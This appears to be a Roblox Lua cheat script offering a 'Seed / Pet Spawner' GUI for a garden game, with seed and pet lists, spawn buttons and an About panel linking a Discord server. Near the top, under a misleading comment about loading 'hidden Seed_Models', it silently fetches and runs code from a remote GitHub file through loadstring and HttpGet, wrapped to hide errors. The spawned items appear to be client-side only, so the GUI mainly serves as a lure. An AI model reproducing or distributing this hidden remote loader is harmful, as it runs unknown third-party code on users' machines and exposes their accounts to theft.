-- 🌱 Seed & Pet Spawner GUI v1.0 | by @mizuscripts

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- Auto-load hidden Seed_Models if needed
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
    end)
end)

-- Wait for Seed_Models
local seedFolder
for i = 1, 300 do
    seedFolder = ReplicatedStorage:FindFirstChild("Seed_Models")
    if seedFolder then break end
    task.wait(0.1)
end

-- GUI Setup
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "SeedPetSpawnerGUI"
gui.ResetOnSpawn = false

local main = Instance.new("Frame", gui)
main.Size = UDim2.new(0, 520, 0, 380)
main.Position = UDim2.new(0.5, -260, 0.5, -190)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
main.Active = true
main.Draggable = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, 10)
local stroke = Instance.new("UIStroke", main)
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
stroke.Color = Color3.fromRGB(0,170,255)
stroke.Thickness = 2

-- Title & Close
local title = Instance.new("TextLabel", main)
title.Text = "[🌱] Seed / Pet Spawner"
title.Font = Enum.Font.GothamBold
title.TextSize = 18
title.TextColor3 = Color3.fromRGB(0,255,150)
title.Size = UDim2.new(1, -70, 0, 30)
title.Position = UDim2.new(0, 10, 0, 5)
title.BackgroundTransparency = 1
title.TextXAlignment = Enum.TextXAlignment.Left

local closeBtn = Instance.new("TextButton", main)
closeBtn.Text = "✕"
closeBtn.Size = UDim2.new(0, 28, 0, 28)
closeBtn.Position = UDim2.new(1, -38, 0, 4)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextSize = 18
closeBtn.TextColor3 = Color3.new(1,1,1)
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
closeBtn.MouseButton1Click:Connect(function() gui.Enabled = false end)

-- Tabs
local tabs = Instance.new("Frame", main)
tabs.Size = UDim2.new(0, 120, 1, -40)
tabs.Position = UDim2.new(0, 10, 0, 40)
tabs.BackgroundTransparency = 1

local pages = Instance.new("Frame", main)
pages.Size = UDim2.new(1, -140, 1, -50)
pages.Position = UDim2.new(0, 130, 0, 40)
pages.BackgroundTransparency = 1

local function createTab(name, yOffset)
    local btn = Instance.new("TextButton", tabs)
    btn.Size = UDim2.new(1, 0, 0, 30)
    btn.Position = UDim2.new(0, 0, 0, yOffset)
    btn.BackgroundColor3 = Color3.fromRGB(30,30,30)
    btn.Text = name
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)

    local page = Instance.new("Frame", pages)
    page.Name = name.."Page"
    page.Size = UDim2.new(1,0,1,0)
    page.BackgroundTransparency = 1
    page.Visible = false

    btn.MouseButton1Click:Connect(function()
        for _, p in ipairs(pages:GetChildren()) do p.Visible = false end
        page.Visible = true
    end)

    return page
end

local seedPage = createTab("Seeds 🌱", 0)
local petPage = createTab("Pets 🐾", 35)
local aboutPage = createTab("Who Are We?", 70)
seedPage.Visible = true

-- Credit Label
local credit = Instance.new("TextLabel", main)
credit.Text = "By @mizuscripts | v1.0"
credit.Font = Enum.Font.Gotham
credit.TextSize = 12
credit.TextColor3 = Color3.new(1,1,1)
credit.BackgroundTransparency = 1
credit.Position = UDim2.new(0,10,1,-20)
credit.Size = UDim2.new(1,-20,0,16)
credit.TextXAlignment = Enum.TextXAlignment.Left

-- PART 2: Seed Spawner
do
    local seeds = {
        "Apple", "Bamboo", "Banana", "Blue Lollipop", "Blueberry","Cactus","Candy Blossom",
        "Candy Sunflower","Carrot","Cherry Blossom","Chocolate Carrot","Coconut","Corn",
        "Cranberry","Crocus","Cursed Fruit","Daffodil","Dragon Fruit","Durian","Easter Egg",
        "Eden Fruit","Eggplant","Grape","Lemon","Mango","Mega Mushroom","Mushroom",
        "Orange Tulip","Papaya","Passionfruit","Peach","Pear","Pineapple","Pink Tulip",
        "Pumpkin","Purple Cabbage","Rasberry","Red Lollipop","Soul Fruit","Strawberry",
        "Succulent","Super","Tomato","Venus Fly Trap","Walking Shark","Watermelon"
    }
    local scroll = Instance.new("ScrollingFrame", seedPage)
    scroll.Size = UDim2.new(0,180,1,-60); scroll.Position = UDim2.new(0,0,0,0)
    scroll.CanvasSize = UDim2.new(0, 0, 0, #seeds * 30); scroll.ScrollBarThickness = 6
    scroll.BackgroundColor3 = Color3.fromRGB(22,22,22)
    Instance.new("UICorner", scroll).CornerRadius = UDim.new(0,6)

    local selectedSeed
    for i, name in ipairs(seeds) do
        local btn = Instance.new("TextButton", scroll)
        btn.Text = name; btn.Size = UDim2.new(1,-10,0,28)
        btn.Position = UDim2.new(0,5,0,(i-1)*30)
        btn.BackgroundColor3 = Color3.fromRGB(30,30,30); btn.TextColor3 = Color3.new(1,1,1)
        btn.Font = Enum.Font.Gotham; btn.TextSize = 14
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
        btn.MouseButton1Click:Connect(function()
            selectedSeed = name
            for _,other in ipairs(scroll:GetChildren()) do
                if other:IsA("TextButton") then other.BackgroundColor3 = Color3.fromRGB(30,30,30) end
            end
            btn.BackgroundColor3 = Color3.fromRGB(0,170,255)
        end)
    end

    local qtyBox = Instance.new("TextBox", seedPage)
    qtyBox.PlaceholderText = "Quantity"
    qtyBox.Size = UDim2.new(0,120,0,30)
    qtyBox.Position = UDim2.new(0,200,0,10)
    qtyBox.BackgroundColor3 = Color3.fromRGB(35,35,35); qtyBox.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", qtyBox).CornerRadius = UDim.new(0,5)

    local spawnBtn = Instance.new("TextButton", seedPage)
    spawnBtn.Text = "Spawn Seed"; spawnBtn.Size = UDim2.new(0,140,0,30)
    spawnBtn.Position = UDim2.new(0,200,0,50)
    spawnBtn.BackgroundColor3 = Color3.fromRGB(0,170,0); spawnBtn.Font = Enum.Font.GothamBold
    spawnBtn.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0,5)

    spawnBtn.MouseButton1Click:Connect(function()
        if not selectedSeed then return end
        local amt = tonumber(qtyBox.Text); if not amt or amt < 1 then return end
        if not seedFolder then return end
        local model = seedFolder:FindFirstChild(selectedSeed)
        if not model then return end

        local tool = Instance.new("Tool")
        tool.RequiresHandle = true
        tool.Name = selectedSeed.." Seed [x"..amt.."]"
        local handle = model:Clone()
        handle.Name = "Handle"; handle.Parent = tool

        tool:SetAttribute("ItemType","Holdable")
        tool:SetAttribute("Quantity", tostring(amt))
        tool:SetAttribute("SeedNamee", selectedSeed)

        tool.Parent = player.Backpack
    end)
end

-- PART 3: Pet Spawner
do
    local pets = {
        "Panda","Pig","Polar Bear","Praying Mantis","Purple Dragonfly","Dragonfly","Raccoon",
        "Red Dragon","Red Fox","Rooster","Sea. Otter","Snail","Snub Nose Monkey",
        "Spotted Deer","Squirrel","Turtle","Queen Bee","Pack Bee","Mimic Octopus",
        "Disco Bee","Butterfly","Bear Bee"
    }
    local scroll = Instance.new("ScrollingFrame", petPage)
    scroll.Size = UDim2.new(0,180,1,-80); scroll.Position = UDim2.new(0,0,0,0)
    scroll.CanvasSize = UDim2.new(0,0,0,#pets*30); scroll.ScrollBarThickness = 6
    scroll.BackgroundColor3 = Color3.fromRGB(22,22,22)
    Instance.new("UICorner", scroll).CornerRadius = UDim.new(0,6)

    local selectedPet
    for i,name in ipairs(pets) do
        local btn = Instance.new("TextButton", scroll)
        btn.Text = name; btn.Size = UDim2.new(1,-10,0,28)
        btn.Position = UDim2.new(0,5,0,(i-1)*30)
        btn.BackgroundColor3 = Color3.fromRGB(30,30,30); btn.TextColor3 = Color3.new(1,1,1)
        btn.Font = Enum.Font.Gotham; btn.TextSize = 14
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
        btn.MouseButton1Click:Connect(function()
            selectedPet = name
            for _,other in ipairs(scroll:GetChildren()) do
                if other:IsA("TextButton") then other.BackgroundColor3 = Color3.fromRGB(30,30,30) end
            end
            btn.BackgroundColor3 = Color3.fromRGB(0,170,255)
        end)
    end

    local weightBox = Instance.new("TextBox", petPage)
    weightBox.PlaceholderText = "Weight (KG)"
    weightBox.Size = UDim2.new(0,140,0,30); weightBox.Position = UDim2.new(0,200,0,10)
    weightBox.BackgroundColor3 = Color3.fromRGB(35,35,35); weightBox.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", weightBox).CornerRadius = UDim.new(0,5)

    local ageBox = Instance.new("TextBox", petPage)
    ageBox.PlaceholderText = "Age"
    ageBox.Size = UDim2.new(0,140,0,30); ageBox.Position = UDim2.new(0,200,0,50)
    ageBox.BackgroundColor3 = Color3.fromRGB(35,35,35); ageBox.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", ageBox).CornerRadius = UDim.new(0,5)

    local spawnBtn = Instance.new("TextButton", petPage)
    spawnBtn.Text = "Spawn Pet"; spawnBtn.Size = UDim2.new(0,140,0,30)
    spawnBtn.Position = UDim2.new(0,200,0,90)
    spawnBtn.BackgroundColor3 = Color3.fromRGB(0,170,0); spawnBtn.Font = Enum.Font.GothamBold
    spawnBtn.TextColor3 = Color3.new(1,1,1); Instance.new("UICorner", spawnBtn).CornerRadius = UDim.new(0,5)

    spawnBtn.MouseButton1Click:Connect(function()
        if not selectedPet then return end
        local wt = weightBox.Text; local age = ageBox.Text
        if wt == "" or age == "" then return end

        local base = ReplicatedStorage:FindFirstChild("Assets")
        base = base and base:FindFirstChild("Models")
        base = base and base:FindFirstChild("PetAssets")
        if not base then return end
        local model = base:FindFirstChild(selectedPet)
        if not model then return end

        local tool = Instance.new("Tool")
        tool.RequiresHandle = true
        tool.Name = selectedPet.." [KG "..wt.."] [Age "..age.."]"

        local handle = Instance.new("Folder", tool)
        handle.Name = "Handle"
        model:Clone().Parent = handle

        tool:SetAttribute("a", player.Name)
        tool:SetAttribute("b", "l")
        tool:SetAttribute("OWNER", player.Name)
        tool:SetAttribute("PetType", "Pet")

        local s = ReplicatedStorage:FindFirstChild("PetToolServer")
        local l = ReplicatedStorage:FindFirstChild("PetToolLocal")
        if s then s:Clone().Parent = tool end
        if l then l:Clone().Parent = tool end

        tool.Parent = player.Backpack
    end)
end

-- PART 4: About Section
local about = Instance.new("TextLabel", aboutPage)
about.Size = UDim2.new(1,-10,1,-10); about.Position = UDim2.new(0,5,0,5)
about.BackgroundTransparency = 1; about.TextWrapped = true
about.TextYAlignment = Enum.TextYAlignment.Top
about.TextXAlignment = Enum.TextXAlignment.Left
about.Font = Enum.Font.Gotham; about.TextSize = 14; about.TextColor3 = Color3.new(1,1,1)
about.Text = [[
This GUI was designed by @mizuscripts
• 🎮 Roblox: @GAGScripter_q  
Powered By @zysumehub & @mizuscripts

• 🌀 Discord: https://discord.gg/jkfBV5FZem 
• 🎥 YouTube: @mizuscripts

STATUS - 🟢

⚠️ DESCLAIMER ⚠️
If Your Seeds Not Growing or Cannot Place Try To Activate "Zysumehub" Script , but dont worry it will automatically execute!

• Report Issues On Via YouTube

Enjoy spawning Seeds & Pets 💛
]]